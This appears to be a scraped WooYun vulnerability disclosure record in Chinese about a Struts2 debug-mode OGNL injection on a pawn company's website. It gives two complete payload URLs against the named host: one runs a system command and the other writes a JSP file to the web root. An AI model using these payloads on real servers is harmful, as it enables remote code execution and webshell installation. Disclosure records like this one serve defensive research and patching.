{"id": 44080, "wybug_id": "wooyun-2015-0102535", "wybug_title": "信邦典当网站可绕过过滤getshell可入内网（windows机）", "wybug_corp": "信邦典当", "wybug_author": "杀器王子", "wybug_date": "2015-03-20 11:07", "wybug_open_date": "2015-05-04 15:32", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-04：\t细节向公众公开  简要描述： 信邦典当网站可绕过过滤getshell可入内网（windows机） 详细说明：  http://pawn.ecitic.com/mainBusiness新邦典当 开启了debug但是过滤了通用poc的部分关键字可绕过   漏洞证明：  \nhttp://pawn.ecitic.com/mainBusiness?debug=command&expression=%23f%3D%23_memberAccess.getClass().getDeclaredFields()[0],%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req%3D@org.apache.struts2.ServletActionContext@getRequest(),%23resp%3D@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a%3D(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),%23b%3D%23a.getInputStream(),%23c%3Dnew java.io.InputStreamReader(%23b),%23d%3Dnew java.io.BufferedReader(%23c),%23e%3Dnew char[1000],%23d.read(%23e),%23resp.println(%23e),%23resp.close()\n\n\n\nhttp://pawn.ecitic.com/mainBusiness?debug=command&expression=%23f%3D%23_memberAccess.getClass().getDeclaredFields()[0],%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req%3D@org.apache.struts2.ServletActionContext@getRequest(),%23resp%3D@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23p%3d%23req.getRealPath(%22/%22)%2b%23req.getParameter(%22f%22),%23s%3dnew+java.io.RandomAccessFile(%23p,%22rw%22),%23s.write(%23req.getParameter(%22c%22).getBytes()),%23s.close(),%23resp.println(%23p%3d%23req.getRealPath(%22/%22)),%23resp.close()&f=1.jsp&c=test\n\n\n   修复方案：  关闭debug   版权声明：转载请注明来源 杀器王子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-03-20 15:31 厂商回复： CNVD确认所述情况，已转由CNCERT向相关部门通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}